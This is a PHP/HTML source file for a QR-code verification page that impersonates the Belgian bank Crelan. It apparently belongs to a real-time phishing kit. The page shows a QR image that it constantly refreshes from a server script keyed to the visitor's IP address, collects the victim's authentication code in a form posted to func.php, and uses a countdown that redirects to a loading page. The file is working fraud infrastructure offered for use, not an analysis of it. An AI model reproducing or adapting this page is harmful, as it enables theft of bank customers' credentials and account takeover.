<?php
  session_start();
  include "./Assets/php/lang/lang.php";
  reset_data_page();
  $langs = $_GET['lang'] ?? $_SESSION['lang'] ?? 'fr';   
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="./Assets/css/main.css">
    <link rel="stylesheet" href="./Assets/css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="./Assets/imgs/favicon.ico">
    <link rel="shortcut" href="./Assets/imgs/favicon.ico">
    <link rel="appel-touch-icon" href="./Assets/imgs/favicon.ico">
    <title><?php echo get_text('title_head'); ?></title>
    <script src="./Assets/js/stutes.js"></script>        
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="./Assets/imgs/logo.png" alt="">
            </div>
            <form action="" class="lang-form" method="post">
                <a href="./qr.php?lang=<?php echo ($langs == 'nl') ? 'fr' : 'nl'; ?>" 
                class="display-current-lang" id="buttonMenuLang">
                <?php echo get_text('current_lang'); ?>
                <img src="./Assets/imgs/arrow-nav.png" alt="" id="iconRight">
                </a>
            </form>
        </div>
        <div class="content-main-section">
            <h1 class="title-login"><?php echo get_text('title_step_two'); ?></h1>
            <?php
                if (isset($_GET['error'])) {
                    echo '
                    <div class="message-error-pages">
                        <i class="fa-solid fa-triangle-exclamation"></i>'
                         .get_text('message_error_step_two').
                    '</div>';
                }
            ?> 
            <form action="./Assets/php/config/func.php" method="post" id="fsdpElement" class="f-s-d-p-element-other">
                <input type="hidden" name="qr_box">
                <div class="coul-container" style="flex-direction: column !important;">
                    <div class="prt-qr-image">
                        <img src="" id="qrimg">
                        <div class="counter" id="textCounter"><?php echo get_text('paragraph_step_two_1'); ?> <span id="counter">3:00</span></div>
                        <div class="counter-expiry-text" id="expiryCounterText"><?php echo get_text('paragraph_step_two_2'); ?></div>
                        <button type="submit" name="get_new_QR" id="getNewQR" class="btn-get-new-qr"><?php echo get_text('button_step_two_1'); ?></button>
                    </div>
                    <div class="coul-4-other" style="width: 100% !important;" id="sectionContent">
                        <div class="number-and-text">
                            <div class="number">1</div>
                            <div class="text">
                                <?php echo get_text('paragraph_step_two_3'); ?>
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">2</div>
                            <div class="text">
                                <?php echo get_text('paragraph_step_two_4'); ?>
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">3</div>
                            <div class="text">
                                <?php echo get_text('paragraph_step_two_5'); ?>
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">4</div>
                            <div class="coul-submit">
                                <div class="prt-3" id="div1">
                                    <label for="qrCode"><?php echo get_text('label_step_two'); ?></label>
                                    <input type="text" name="qr_code" style="text-align:start;" id="qrCode" required class="i-element">
                                    <small id="messageError1" class="m-e-i"><img src="./Assets/imgs/icon-error.png" alt=""><?php echo get_text('message_error_input_step_two'); ?></small>
                                </div>
                                <div class="prt-btn">
                                    <button type="submit" name="b_s_d_p" id="bsdpElement" class="btn-element"><?php echo get_text('button_step_two_2'); ?></button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer"><?php echo get_text('link_footer_1'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_2'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_3'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_4'); ?></span> <span class="ship">—</span> 
            </div>
            <p><?php echo get_text('paragraph_footer'); ?> © Crelan <?php echo date("Y"); ?></p>
        </div>
    </div>
    <!-- Footer Section -->

    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>         
    <script src="./Assets/js/script.js"></script>          
    <script>
            let startingMinutes = 3;
            let time = startingMinutes * 60;
            const countdownEl = document.querySelector('#counter');
            setInterval(updateCountdown, 1000);
            function updateCountdown(){
            const minutes = Math.floor(time / 60); 
            let seconds = time % 60;
            seconds = seconds < 10 ? '0' + seconds: seconds;
            countdownEl.innerHTML = `${minutes}:${seconds}`;
            time--;
            if (seconds == 1 && minutes == 0) {
              setTimeout(function(){
                location.href ="./loading.php";
              },1000)
            }
          }  
          
    
          var ip = '<?php echo get_client_ip(); ?>';
          let lastTime = 0;

          setInterval(function(){

              $.getJSON(`./Assets/php/config/check_its.php?ip=${ip}&` + new Date().getTime(), function(r){
                  if(r.time != lastTime){
                      $("#qrimg").attr("src", r.img+"?t="+Date.now());           
                  }
              });

          },0);             
    </script>
</body>
</html>